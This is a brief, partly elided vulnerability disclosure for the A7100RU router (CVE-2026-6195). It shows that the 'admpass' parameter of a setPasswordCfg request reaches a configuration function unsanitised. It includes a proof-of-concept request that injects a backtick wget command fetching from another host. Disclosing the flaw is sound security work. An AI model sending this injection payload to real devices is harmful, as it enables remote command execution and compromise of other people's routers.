# A7100RU Vulnerability（CVE-2026-6195）
...
In sub_42E100 function, it reads in a user-provided parameter `admpass` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
{"topicurl":"setPasswordCfg","admpass":"`wget 192.168.6.1:7777/testpoc`"
}
```
